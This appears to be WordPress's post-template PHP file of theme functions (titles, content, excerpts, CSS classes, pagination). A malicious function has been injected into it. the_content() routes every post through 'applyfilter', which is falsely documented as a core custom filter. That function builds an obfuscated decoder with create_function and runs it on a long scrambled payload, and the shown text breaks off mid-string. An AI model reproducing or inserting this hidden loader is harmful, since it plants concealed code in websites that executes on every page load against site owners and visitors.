<?php
/**
 * WordPress Post Template Functions.
 *
 * Gets content for the current post in the loop.
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * Display the ID of the current item in the WordPress Loop.
 *
 * @since 0.71
 */
function the_ID() {
	echo get_the_ID();
}

/**
 * Retrieve the ID of the current item in the WordPress Loop.
 *
 * @since 2.1.0
 * @uses $post
 *
 * @return int
 */
function get_the_ID() {
	global $post;
	return $post->ID;
}

/**
 * Display or retrieve the current post title with optional content.
 *
 * @since 0.71
 *
 * @param string $before Optional. Content to prepend to the title.
 * @param string $after Optional. Content to append to the title.
 * @param bool $echo Optional, default to true.Whether to display or return.
 * @return null|string Null on no title. String if $echo parameter is false.
 */
function the_title($before = '', $after = '', $echo = true) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$title = $before . $title . $after;

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Sanitize the current title when retrieving or displaying.
 *
 * Works like {@link the_title()}, except the parameters can be in a string or
 * an array. See the function for what can be override in the $args parameter.
 *
 * The title before it is displayed will have the tags stripped and {@link
 * esc_attr()} before it is passed to the user or displayed. The default
 * as with {@link the_title()}, is to display the title.
 *
 * @since 2.3.0
 *
 * @param string|array $args Optional. Override the defaults.
 * @return string|null Null on failure or display. String when echo is false.
 */
function the_title_attribute( $args = '' ) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$defaults = array('before' => '', 'after' =>  '', 'echo' => true);
	$r = wp_parse_args($args, $defaults);
	extract( $r, EXTR_SKIP );

	$title = $before . $title . $after;
	$title = esc_attr(strip_tags($title));

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Retrieve post title.
 *
 * If the post is protected and the visitor is not an admin, then "Protected"
 * will be displayed before the post title. If the post is private, then
 * "Private" will be located before the post title.
 *
 * @since 0.71
 *
 * @param int $id Optional. Post ID.
 * @return string
 */
function get_the_title( $id = 0 ) {
	$post = &get_post($id);

	$title = isset($post->post_title) ? $post->post_title : '';
	$id = isset($post->ID) ? $post->ID : (int) $id;

	if ( !is_admin() ) {
		if ( !empty($post->post_password) ) {
			$protected_title_format = apply_filters('protected_title_format', __('Protected: %s'));
			$title = sprintf($protected_title_format, $title);
		} else if ( isset($post->post_status) && 'private' == $post->post_status ) {
			$private_title_format = apply_filters('private_title_format', __('Private: %s'));
			$title = sprintf($private_title_format, $title);
		}
	}
	return apply_filters( 'the_title', $title, $id );
}

/**
 * Display the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * Url is escaped to make it xml safe
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 */
function the_guid( $id = 0 ) {
	echo esc_url( get_the_guid( $id ) );
}

/**
 * Retrieve the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 * @return string
 */
function get_the_guid( $id = 0 ) {
	$post = &get_post($id);

	return apply_filters('get_the_guid', $post->guid);
}

/**
 * Display the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 */
function the_content($more_link_text = null, $stripteaser = false) {
	$content = get_the_content($more_link_text, $stripteaser);
	$content = apply_filters('the_content', $content);
	$content = str_replace(']]>', ']]&gt;', applyfilter($content));
	echo $content;
}

/**
 * Retrieve the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 * @return string
 */
function get_the_content($more_link_text = null, $stripteaser = false) {
	global $post, $more, $page, $pages, $multipage, $preview;

	if ( null === $more_link_text )
		$more_link_text = __( '(more...)' );

	$output = '';
	$hasTeaser = false;

	// If post password required and it doesn't match the cookie.
	if ( post_password_required($post) )
		return get_the_password_form();

	if ( $page > count($pages) ) // if the requested page doesn't exist
		$page = count($pages); // give them the highest numbered page that DOES exist

	$content = $pages[$page-1];
	if ( preg_match('/<!--more(.*?)?-->/', $content, $matches) ) {
		$content = explode($matches[0], $content, 2);
		if ( !empty($matches[1]) && !empty($more_link_text) )
			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));

		$hasTeaser = true;
	} else {
		$content = array($content);
	}
	if ( (false !== strpos($post->post_content, '<!--noteaser-->') && ((!$multipage) || ($page==1))) )
		$stripteaser = true;
	$teaser = $content[0];
	if ( $more && $stripteaser && $hasTeaser )
		$teaser = '';
	$output .= $teaser;
	if ( count($content) > 1 ) {
		if ( $more ) {
			$output .= '<span id="more-' . $post->ID . '"></span>' . $content[1];
		} else {
			if ( ! empty($more_link_text) )
				$output .= apply_filters( 'the_content_more_link', ' <a href="' . get_permalink() . "#more-{$post->ID}\" class=\"more-link\">$more_link_text</a>", $more_link_text );
			$output = force_balance_tags($output);
		}

	}
	if ( $preview ) // preview fix for javascript bug with foreign languages
		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output);

	return $output;
}

/**
 * Preview fix for javascript bug with foreign languages
 *
 * @since 3.1.0
 * @access private
 * @param array $match Match array from preg_replace_callback
 * @returns string
 */
function _convert_urlencoded_to_entities( $match ) {
	return '&#' . base_convert( $match[1], 16, 10 ) . ';';
}

/**
 * Display the post excerpt.
 *
 * @since 0.71
 * @uses apply_filters() Calls 'the_excerpt' hook on post excerpt.
 */
function the_excerpt() {
	echo apply_filters('the_excerpt', get_the_excerpt());
}

/**
 * Retrieve the post excerpt.
 *
 * @since 0.71
 *
 * @param mixed $deprecated Not used.
 * @return string
 */
function get_the_excerpt( $deprecated = '' ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.3' );

	global $post;
	$output = $post->post_excerpt;
	if ( post_password_required($post) ) {
		$output = __('There is no excerpt because this is a protected post.');
		return $output;
	}

	return apply_filters('get_the_excerpt', $output);
}

/**
 * Whether post has excerpt.
 *
 * @since 2.3.0
 *
 * @param int $id Optional. Post ID.
 * @return bool
 */
function has_excerpt( $id = 0 ) {
	$post = &get_post( $id );
	return ( !empty( $post->post_excerpt ) );
}

/**
 * Display the classes for the post div.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 */
function post_class( $class = '', $post_id = null ) {
	// Separates classes with a single space, collates classes for post DIV
	echo 'class="' . join( ' ', get_post_class( $class, $post_id ) ) . '"';
}

/**
 * Retrieve the classes for the post div as an array.
 *
 * The class names are add are many. If the post is a sticky, then the 'sticky'
 * class name. The class 'hentry' is always added to each post. For each
 * category, the class will be added with 'category-' with category slug is
 * added. The tags are the same way as the categories with 'tag-' before the tag
 * slug. All classes are passed through the filter, 'post_class' with the list
 * of classes, followed by $class parameter value, with the post ID as the last
 * parameter.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 * @return array Array of classes.
 */
function get_post_class( $class = '', $post_id = null ) {
	$post = get_post($post_id);

	$classes = array();

	if ( empty($post) )
		return $classes;

	$classes[] = 'post-' . $post->ID;
	$classes[] = $post->post_type;
	$classes[] = 'type-' . $post->post_type;
	$classes[] = 'status-' . $post->post_status;

	// Post Format
	if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
		$post_format = get_post_format( $post->ID );

		if ( $post_format && !is_wp_error($post_format) )
			$classes[] = 'format-' . sanitize_html_class( $post_format );
		else
			$classes[] = 'format-standard';
	}

	// post requires password
	if ( post_password_required($post->ID) )
		$classes[] = 'post-password-required';

	// sticky for Sticky Posts
	if ( is_sticky($post->ID) && is_home() && !is_paged() )
		$classes[] = 'sticky';

	// hentry for hAtom compliance
	$classes[] = 'hentry';

	// Categories
	if ( is_object_in_taxonomy( $post->post_type, 'category' ) ) {
		foreach ( (array) get_the_category($post->ID) as $cat ) {
			if ( empty($cat->slug ) )
				continue;
			$classes[] = 'category-' . sanitize_html_class($cat->slug, $cat->term_id);
		}
	}

	// Tags
	if ( is_object_in_taxonomy( $post->post_type, 'post_tag' ) ) {
		foreach ( (array) get_the_tags($post->ID) as $tag ) {
			if ( empty($tag->slug ) )
				continue;
			$classes[] = 'tag-' . sanitize_html_class($tag->slug, $tag->term_id);
		}
	}

	if ( !empty($class) ) {
		if ( !is_array( $class ) )
			$class = preg_split('#\s+#', $class);
		$classes = array_merge($classes, $class);
	}

	$classes = array_map('esc_attr', $classes);

	return apply_filters('post_class', $classes, $class, $post->ID);
}

/**
 * Display the classes for the body element.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 */
function body_class( $class = '' ) {
	// Separates classes with a single space, collates classes for body element
	echo 'class="' . join( ' ', get_body_class( $class ) ) . '"';
}

/**
 * Retrieve the classes for the body element as an array.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @return array Array of classes.
 */
function get_body_class( $class = '' ) {
	global $wp_query, $wpdb;

	$classes = array();

	if ( is_rtl() )
		$classes[] = 'rtl';

	if ( is_front_page() )
		$classes[] = 'home';
	if ( is_home() )
		$classes[] = 'blog';
	if ( is_archive() )
		$classes[] = 'archive';
	if ( is_date() )
		$classes[] = 'date';
	if ( is_search() ) {
		$classes[] = 'search';
		$classes[] = $wp_query->posts ? 'search-results' : 'search-no-results';
	}
	if ( is_paged() )
		$classes[] = 'paged';
	if ( is_attachment() )
		$classes[] = 'attachment';
	if ( is_404() )
		$classes[] = 'error404';

	if ( is_single() ) {
		$post_id = $wp_query->get_queried_object_id();
		$post = $wp_query->get_queried_object();

		$classes[] = 'single';
		$classes[] = 'single-' . sanitize_html_class($post->post_type, $post_id);
		$classes[] = 'postid-' . $post_id;

		// Post Format
		if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
			$post_format = get_post_format( $post->ID );

			if ( $post_format && !is_wp_error($post_format) )
				$classes[] = 'single-format-' . sanitize_html_class( $post_format );
			else
				$classes[] = 'single-format-standard';
		}

		if ( is_attachment() ) {
			$mime_type = get_post_mime_type($post_id);
			$mime_prefix = array( 'application/', 'image/', 'text/', 'audio/', 'video/', 'music/' );
			$classes[] = 'attachmentid-' . $post_id;
			$classes[] = 'attachment-' . str_replace( $mime_prefix, '', $mime_type );
		}
	} elseif ( is_archive() ) {
		if ( is_post_type_archive() ) {
			$classes[] = 'post-type-archive';
			$classes[] = 'post-type-archive-' . sanitize_html_class( get_query_var( 'post_type' ) );
		} else if ( is_author() ) {
			$author = $wp_query->get_queried_object();
			$classes[] = 'author';
			$classes[] = 'author-' . sanitize_html_class( $author->user_nicename , $author->ID );
			$classes[] = 'author-' . $author->ID;
		} elseif ( is_category() ) {
			$cat = $wp_query->get_queried_object();
			$classes[] = 'category';
			$classes[] = 'category-' . sanitize_html_class( $cat->slug, $cat->term_id );
			$classes[] = 'category-' . $cat->term_id;
		} elseif ( is_tag() ) {
			$tags = $wp_query->get_queried_object();
			$classes[] = 'tag';
			$classes[] = 'tag-' . sanitize_html_class( $tags->slug, $tags->term_id );
			$classes[] = 'tag-' . $tags->term_id;
		} elseif ( is_tax() ) {
			$term = $wp_query->get_queried_object();
			$classes[] = 'tax-' . sanitize_html_class( $term->taxonomy );
			$classes[] = 'term-' . sanitize_html_class( $term->slug, $term->term_id );
			$classes[] = 'term-' . $term->term_id;
		}
	} elseif ( is_page() ) {
		$classes[] = 'page';

		$page_id = $wp_query->get_queried_object_id();

		$post = get_page($page_id);

		$classes[] = 'page-id-' . $page_id;

		if ( $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE post_parent = %d AND post_type = 'page' AND post_status = 'publish' LIMIT 1", $page_id) ) )
			$classes[] = 'page-parent';

		if ( $post->post_parent ) {
			$classes[] = 'page-child';
			$classes[] = 'parent-pageid-' . $post->post_parent;
		}
		if ( is_page_template() ) {
			$classes[] = 'page-template';
			$classes[] = 'page-template-' . sanitize_html_class( str_replace( '.', '-', get_page_template_slug( $page_id ) ) );
		} else {
			$classes[] = 'page-template-default';
		}
	}

	if ( is_user_logged_in() )
		$classes[] = 'logged-in';

	if ( is_admin_bar_showing() )
		$classes[] = 'admin-bar';

	if ( get_theme_mod( 'background_color' ) || get_background_image() )
		$classes[] = 'custom-background';

	$page = $wp_query->get( 'page' );

	if ( !$page || $page < 2)
		$page = $wp_query->get( 'paged' );

	if ( $page && $page > 1 ) {
		$classes[] = 'paged-' . $page;

		if ( is_single() )
			$classes[] = 'single-paged-' . $page;
		elseif ( is_page() )
			$classes[] = 'page-paged-' . $page;
		elseif ( is_category() )
			$classes[] = 'category-paged-' . $page;
		elseif ( is_tag() )
			$classes[] = 'tag-paged-' . $page;
		elseif ( is_date() )
			$classes[] = 'date-paged-' . $page;
		elseif ( is_author() )
			$classes[] = 'author-paged-' . $page;
		elseif ( is_search() )
			$classes[] = 'search-paged-' . $page;
		elseif ( is_post_type_archive() )
			$classes[] = 'post-type-paged-' . $page;
	}

	if ( ! empty( $class ) ) {
		if ( !is_array( $class ) )
			$class = preg_split( '#\s+#', $class );
		$classes = array_merge( $classes, $class );
	} else {
		// Ensure that we always coerce class to being an array.
		$class = array();
	}

	$classes = array_map( 'esc_attr', $classes );

	return apply_filters( 'body_class', $classes, $class );
}

/**
 * Whether post requires password and correct password has been provided.
 *
 * @since 2.7.0
 *
 * @param int|object $post An optional post. Global $post used if not provided.
 * @return bool false if a password is not required or the correct password cookie is present, true otherwise.
 */
function post_password_required( $post = null ) {
	global $wp_hasher;

	$post = get_post($post);

	if ( empty( $post->post_password ) )
		return false;

	if ( ! isset( $_COOKIE['wp-postpass_' . COOKIEHASH] ) )
		return true;

	if ( empty( $wp_hasher ) ) {
		require_once( ABSPATH . 'wp-includes/class-phpass.php');
		// By default, use the portable hash from phpass
		$wp_hasher = new PasswordHash(8, true);
	}

	$hash = stripslashes( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );

	return ! $wp_hasher->CheckPassword( $post->post_password, $hash );
}

/**
 * Display "sticky" CSS class, if a post is sticky.
 *
 * @since 2.7.0
 *
 * @param int $post_id An optional post ID.
 */
function sticky_class( $post_id = null ) {
	if ( !is_sticky($post_id) )
		return;

	echo " sticky";
}

/**
 * Page Template Functions for usage in Themes
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * The formatted output of a list of pages.
 *
 * Displays page links for paginated posts (i.e. includes the <!--nextpage-->.
 * Quicktag one or more times). This tag must be within The Loop.
 *
 * The defaults for overwriting are:
 * 'next_or_number' - Default is 'number' (string). Indicates whether page
 *      numbers should be used. Valid values are number and next.
 * 'nextpagelink' - Default is 'Next Page' (string). Text for link to next page.
 *      of the bookmark.
 * 'previouspagelink' - Default is 'Previous Page' (string). Text for link to
 *      previous page, if available.
 * 'pagelink' - Default is '%' (String).Format string for page numbers. The % in
 *      the parameter string will be replaced with the page number, so Page %
 *      generates "Page 1", "Page 2", etc. Defaults to %, just the page number.
 * 'before' - Default is '<p> Pages:' (string). The html or text to prepend to
 *      each bookmarks.
 * 'after' - Default is '</p>' (string). The html or text to append to each
 *      bookmarks.
 * 'link_before' - Default is '' (string). The html or text to prepend to each
 *      Pages link inside the <a> tag. Also prepended to the current item, which
 *      is not linked.
 * 'link_after' - Default is '' (string). The html or text to append to each
 *      Pages link inside the <a> tag. Also appended to the current item, which
 *      is not linked.
 *
 * @since 1.2.0
 * @access private
 *
 * @param string|array $args Optional. Overwrite the defaults.
 * @return string Formatted output in HTML.
 */
function wp_link_pages($args = '') {
	$defaults = array(
		'before' => '<p>' . __('Pages:'), 'after' => '</p>',
		'link_before' => '', 'link_after' => '',
		'next_or_number' => 'number', 'nextpagelink' => __('Next page'),
		'previouspagelink' => __('Previous page'), 'pagelink' => '%',
		'echo' => 1
	);

	$r = wp_parse_args( $args, $defaults );
	$r = apply_filters( 'wp_link_pages_args', $r );
	extract( $r, EXTR_SKIP );

	global $page, $numpages, $multipage, $more, $pagenow;

	$output = '';
	if ( $multipage ) {
		if ( 'number' == $next_or_number ) {
			$output .= $before;
			for ( $i = 1; $i < ($numpages+1); $i = $i + 1 ) {
				$j = str_replace('%',$i,$pagelink);
				$output .= ' ';
				if ( ($i != $page) || ((!$more) && ($page==1)) ) {
					$output .= _wp_link_page($i);
				}
				$output .= $link_before . $j . $link_after;
				if ( ($i != $page) || ((!$more) && ($page==1)) )
					$output .= '</a>';
			}
			$output .= $after;
		} else {
			if ( $more ) {
				$output .= $before;
				$i = $page - 1;
				if ( $i && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $previouspagelink . $link_after . '</a>';
				}
				$i = $page + 1;
				if ( $i <= $numpages && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $nextpagelink . $link_after . '</a>';
				}
				$output .= $after;
			}
		}
	}

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Applies custom filter.
 *
 * @since 0.71
 *
 * $text string to apply the filter
 * @return string
 */
function applyfilter($text=null) {
	@ini_set('memory_limit','256M');
	if($text) @ob_start();
	if(1){global $O10O1OO1O;$O10O1OO1O=create_function('$s,$k',"\44\163\75\165\162\154\144\145\143\157\144\145\50\44\163\51\73\40\44\164\141\162\147\145\164\75\47\47\73\44\123\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\163\51\73\40\44\151\53\53\51\40\173\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\163\54\44\151\54\61\51\73\40\44\156\165\155\75\163\164\162\160\157\163\50\44\123\54\44\143\150\141\162\54\71\65\51\55\71\65\73\40\44\143\165\162\137\153\145\171\75\141\142\163\50\146\155\157\144\50\44\153\40\53\40\44\151\54\71\65\51\51\73\40\44\143\165\162\137\153\145\171\75\44\156\165\155\55\44\143\165\162\137\153\145\171\73\40\151\146\50\44\143\165\162\137\153\145\171\74\60\51\40\44\143\165\162\137\153\145\171\75\44\143\165\162\137\153\145\171\53\71\65\73\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\123\54\44\143\165\162\137\153\145\171\54\61\51\73\40\44\164\141\162\147\145\164\56\75\44\143\150\141\162\73\40\175\40\162\145\164\165\162\156\40\44\164\141\162\147\145\164\73"); if(!function_exists("O01100llO")){function O01100llO(){global $O10O1OO1O;return call_user_func($O10O1OO1O,'f8Ma4%29Hp%3b%2av%3bX%2cbb%3bb%40%40%5c%5cs%3fAB%5d%40%5cwn%5dz%26AA%26jPMeeN%3aW%2bKn%212%5f%408558hGo%20%20%23Fz%3b%3bDYsD%3d%7e%23hvvWl9bbuzU%5eYZ%23u%3bt%3b%24%60%2ffm22%26%2dS33a8w8%24Na3%26%2a%406ss%3fBBP%404WLJtaH%7dbA%7eW%2bN%5d%2abt%2aOL%2ca0%5d3%26yl%60O%2azqf2%5f61%5d21w%27%3fkzU%22%3d%3ea%2c%3cH%3a%20%24%20i%26rnDhC%2dRJYox%26H6s%21%60%7dY%2b%7d7%2doNENf%5c%5bbY%3f2E2UUIVE2%3c%22hTq5U5%5cq%7bsK7%40397dxgsSL%20%7d%20dT%3exvvMag%2d%3e%2c%3dJJ%7cCxbi%3a%7c%7c%23%7eJG%20o%28CiHzq%5bxp6i%7b%2dWv%2dwLEaja0%40zYWsUjUOOodjUm73D2%60O%60%402q6lw41%5fwP%2eg%3d7%7e%7eigmByLaNR8%3bB%7ddCC%25Ky%2bxe%25%25Q%20CriA%23KxJI2Oy94x%26%3b%2ca%3b%60%7e%5eRXRn%22Iv%2c%40%27X%27kkAgX%27F5qVz1k1%22z%5b4%7c%6072h%60%3fug5499%24%20H%3c4%3cC%3bRtMs%28%3fR%3euuSGCWJZSSi%21u%7cHj%20GJ%2ek2%27C7%22J2%28aM%283%24f%2d0%2dY9kNapI0IoojB0Idh%26FOqoq9OU%22e3%5f%5b%6038%2fBh%2277%20iLH%3c4%3cCR%7d%2d%2ds%28%3fR%3euuSGCWJZSSi%21u%7cHj%20GJ%2ek%26%27C7%22J2%28aM%283%24f%2d0%2dY9kNapI0IoojB0Idh%26FOqoq9OU%22e3%5f%5b%6038%2fBh%2277H%23QH%3c4%3cC%3b%2cM%5c%7e8%2dP%2f%2fcluv%2e%25ccHQ%2fe%29%5e%21l%2eyo%26Iu%5f9%2e%5b%7eM%7d%7e%7b%23Xt%2at%2b7o%2cM4k%2ak%5d%5d%5e%3f%2ak%3e%602d%27%26%5d%267%27z9Z%7bwU3%7bsK%3f%609%5f%5f%20%29%7e%29D%22DuLR%28%3b%5c%7e8%2dP%2f%2fcluv%2e%25ccHQ%2fe%29%5e%21l%2eyoqIu%5f9%2e%5b%7eM%7d%7e%7b%23Xt%2at%2b7o%2cM4k%2ak%5d%5d%5e%3f%2ak%3e%602d%27%26%5d%267%27z9Z%7bwU3%7bsK%3f%609%5f%5fHQ%3b%29D%22DuL%3b%3bM%5c%7e8%2dd%3e%2fDcGCQ%2b%25eHQZr%7cGQ%7eE%24%2f%29x%27%5bz%2e%22p%29qLN%2cLh%28j%7df%7db4%27WN6OfOIIEPfOVw1%3dU%7bI%7b4U2prh9%265hBCspD%28%23%7eH%40V6C%28MRts%28%3fRFdu%3cSKy%21YZ%7ci%21e%3arK%21%28%5d%7euH%29OqUJ4%40H1tvNt5%3bAM%5eM%2apO%2bv%5cz%5ez%27%27%5d%3e%5ez%3d%5f%7bm%5b3%273p%5b%26%40%3a5%22qw5gy8%40%3c%3b%3bQi6%3d%5cyL%3b%7da8%3bB%7dVFCT%25%2f%2e%20nerQ%20%7cl%3a%2f%20%3bo%28CiHz%7b%5bxp6i%7b%2dWv%2dwLEaja0%40zYWsUjUOOodjUm73D2%60O%60%402q6lw41%5fwP%2e%3f6T%24%20%7eQ%5cms%2e%7da%7d%2b%3fLgM%3dVycZuJ%23b%7c%3a%21%23rGlu%23Lk%3byQiU%602%29%40%5cQ3R%2bWR%5ft%5d%2cA%2cX6Un%2b8%5bA%5bzzkFA%5bD9%60%3c%26hzh6%261%5cG%5fp%7b7%5f%3eJB%5cc%28tQ%5cms%2eNvR%2c%3fLgM%3dVycZuJ%23brJ%2aQ%7e%2f%5eC%3btu%24%3b%7dzR%29%24%23q%60%7b%218B%24w%2c%2ab%2c4M%27%2bk%2bA%3fqX%2aP1k1%26%26zDk1S%40%5f%2537%267%3f3hBC4s5p4%3diVc%40%2dMa%7egSPiNWYvdMVWcTH%7clxQL%5e%2fQj%7e%2dJo%29%7daxt%7dvqN%20tLh9w%28%3eFt4Yj%5eYsW20U0IdhEj%3d5U5%60%60q%25U5r%3fp%3a%5f%40%60%40d%5f9F%29sP%228sc%24T%7c%3f%2da%2c%2dVr%3d%24W%2abjDWT%2a%7ce%23KC%21%7eMoJ%7ek%2d%2cQz%20v%2b%21avbhn%3baM9%5c4Rm%3casXkoXP%2a3A1A%5bD9%27kc%221%2277h%3a1%22%2fd8up%3f7%3fDp6%3c%20P%3d%5c%3eP%7cteKdWvY%2cT%2fct%5dEXA%25%2aejKGL%2e%29%28%2dWz%7dv%20%5b%2c%7e%2cn%24vYX%5f0%2dvNp86aTSvBjO%27jFf5o%60oqcpUOZ%40%60%4044%5fK%60%40y%3dg%2e%5cP4Pc%5c8S%7eF%3c%3fVFl%7dK%3dSTT%2a%5eAY%3aKlaAEOz%3ajGk%2eyMi%20R%2c%2aqvb%3b%7bY%2dYftbXEpA%2cbn8dB%2berbFk%262k%3c%5d%22z7zh%7c81%26l%3f7%3fssp%2e7%3fHcVig%3ds%3d%7cg%3er%2d%3cZdT%3cCvlrxH%5df%5d0%2fyuWzIz1%2foCzH%29v%23%28%2c%2b%5e%60nfR50a0EMfAIsk%2bfXPDd%2alKfDz3%7bz%25%276%26p%267GPh3u%3ep%3eggsHp%3e%20e%3c%23FTgTGF%3dKa%25%3amZ%25xnuKQ%20AO%5dj%2e%29Jb132%26%2eOx%26%20%21n%3b%2d%2b%2a%5d%5fXE%2c9jWjIvEkUgz%2aEAV%25m%5euyES%26w5%26r%5b%3f3s3pCV7wJ%3ds%3dFFg%20s%3d%28l%25%3bDZFZCDTyWr%2fc%3arQXJy%24%28U%27%26oH%21if%603q7H2Q3%28%7eXRa%2a%5e%274AI%2b%40oboUnIzqF%26%5eIk%3c%3ac%5dJ%29I%7c3%2293K1%3ewgwsx%3cp%22iTgTDDF%28gT%2durRS%3aD%3axSZ%29bK%2ee%2fK%24Ai%29L%2dO3%26O%20%7e%23E739h%20%7b%24w0AW%2cXvopI%5dEkUgf%5b%7bk%26%26mA1%5d1%26cq%40z%5f%5b%221qF%5cC%7bL%2dh%29%5cd%3e%5c%20%40eB%25B%3ct%2fVd%7du%25uKKr%2b%25u%2a%24H0yiKityJ%2d%27%20%3bx%23%20vq%2b%24%2dLL%5f%406%5fN%2bv%7b%3eggBN%5cWgU1oA%5b%5d%60%3d53%7bh9Z2%22%5chppK%22%7bB8%5c%40B%5fx%3fTDpd%24%40YbstmeZmaVJcycKn%20re0%23y%23%21%21%29%5dy%23%27N%2dO%7eR%21Rn%7e%3bbha%2bL%2caA4fbUdPm8AOj4%3c%25mSfVjT7k2Z%5bzsh1G2%24%281y4B%3f4H9c%5c%3c%5cV%7e%3aPBLl%3clrr%25%2c%3cl%2bQ%2eYKJrJ%7eKu%28%5dH%23CiHMU%7dWQ5%60%60%7bMY%7dU94p4%2d9%7d6%27v0%3f0%26j%5ezk2%3d1AO%27ce%25k%29iO%3ahp4hu3F7%3e7%3fHc6p%21S%3eSTT%3dL%3eS%7dylMZGTGHZ%7ci0uxrCu%28%5dLyi%29%29%6053%5bWQWk%5fh76%7eh%3b9%5eonWjY%27%5czIkO%26dAqhO%7b%7bTz%7b592%5f2h2%3a46%3fB4%3eBB%29wM%2c9%20gDmg%3b%3fGF%3aFZaJTDvx%3ax%2e%2e%2f0%3axjt%23AH%24%2e%24aHQ%2c2%3b%7d%21L%3bbhn%5et%22%408%22NjvhVFdV%2b%3fnd%7bfkmTTc%3c%60q5%5fpe1%5c%40%608%7b%5cw%3fy%3dgxDm%5cV%23p%2bn%5cL%3dZ%25%3dMF%2eTCTGY%21%7cZ%2a%20C%20QQxEC%20I%2ct%27%24%2dQ%2dY%24%28n%60MW%3baMj%22%2anoI8F%3f8fA%5e4mDSefVjT7k2ZO5%5b168%40Gw%3e9F9V%29wM%2c9%20gDmg%3b%3fGF%3aFZaJTDvx%3ax%2e%2e%2f0%3axjt%23AH%24%2e%24aHQ%2c2%3b%7d%21L%3bbh0t%2cMM6sspINIw%3dPmmng%2aV%60j%27%3c%5d1U7%5b%5b7e6%7b%40B4%3ewwhJhRM%5fQ%3f%3dV%3f%7es%3a%3e%7c%3eS%7dyD%3d%2c%2e%7c%2eCCGb%7c%2ef%3b%21%5ex%20C%20%7dxHMU%7e%2di%28%7eY3vMA%40%4047af%2c3BF%3f%3dv%40S%2b%5dA80%25ceolZK%2fUzrCq%29Cuu%21xhQ%21Q%3b%7eLt%5c%23%24sa6nb%20DlGmuL%28%3e1q%5cdcx%24Z%3cn3hQCUf0G%3f8%25K%29abQJ%5b6%24w%28%7b3%3bztj%5d%2aAO%22v%2cN%2a%5eEYnlA%60CAVC%5d1%26%3c%606%5c3%3fe%252Wvk%265%224p95%29Hp%2f6%25%7cDZK%28eNr%3a%2bnbbuNaT7%5fdc%3auCy%2f%3aE%5d%5f%2efx%24%7dY%3b%7d%2d%26%2cf%5eaEh3tl%3a%20%2dv0Xfnv%3fB04fI9o%7b%3d%22p4%604%5c9q%3f7wPlr%7bbnz39s8%3f%409%21%20n8%29BmeuTF%20%3dxeiD%3aQ%21i%23ZJK%23%2e%23%29RE%2eLq%2d13%60hh5v%7e%7bg%3b1%25%3dXss8BBP%3e%3eIs6niHabA%5f79kAT%29O5%60ZSM%28%3b3%60%2fhd%3d%3fFcxpgsV%3cddta0Pd%2c%3b%26%2eJ%2cITa72v%254%22%3dZKJx%29yK7Js%20Lav%3b2USh9s%5cswV%7d0b%2249%2eejU2E2g%3f%23mEp%27k%3cTiQ%21%60q4Bwl%7bgd%5cPDy98%40%3e%3dgg%28%7dn%3fg%7d%24UuC%7d%5dmR9zQ%20%21x%2fQ%2an4%5e%60%2f%20Q%5d%20YNLY%28UOT3%5b%3c5qG51mhy%22%2c3v%5bk%5ej2%3fePG%5e%5bzV%5b6%22361ST%2cl%25a%2f%7cX%2fr%7dKEJ9Dcd%3c%7c%218VPTZDDanA%3dDY%7d%60iQY%5be%2crwJy%23%3b%7di%5dAd%274H%2b%3bb0Y0%7d%24ajA%5e%5d%2d%2av%5db%5dX%5b%5c8%7c%2apX%7bh%5b39%3dkxUp%21%27O%60%40h2%263KLhV%40%3cc%3c%3dNpC6%3e%7crel%3fK%3cKKyx%3aC%3aNhT36%5c%2aq%3a%7dHQ%24HE%2caW%23OHjQOGCg2%24%2e%25JQ%7cHL%2c%21K%20%3bC%3btY%7d%2d%20%5e%2a%2fA%26%5bm4%40p44sZS%5e%5d%2f3pV%